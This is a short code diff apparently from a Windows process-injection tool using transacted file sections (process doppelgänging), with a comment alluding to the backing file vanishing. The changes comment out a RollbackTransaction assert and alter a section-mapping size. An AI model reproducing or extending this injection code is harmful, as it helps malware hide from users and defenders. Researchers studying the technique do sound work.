@@ -79,7 +79,7 @@ HANDLE create_sheep_section(void) {
 
    /* *jedi hands* there was never a file */
    CloseHandle(sheep_monitor_file);
-   assert(RollbackTransaction(transaction));
+   // assert(RollbackTransaction(transaction));
 
    return sheep_section;
 }
@@ -156,7 +156,7 @@ int main(int argc, char *argv[]) {
                              GetCurrentProcess(), // explorer_proc,
                              &remote_sheep_base,
                              0,
-                             sheep_nt->OptionalHeader.SizeOfImage,
+                             0,
                              NULL,
                              &remote_sheep_size,
                              ViewShare,
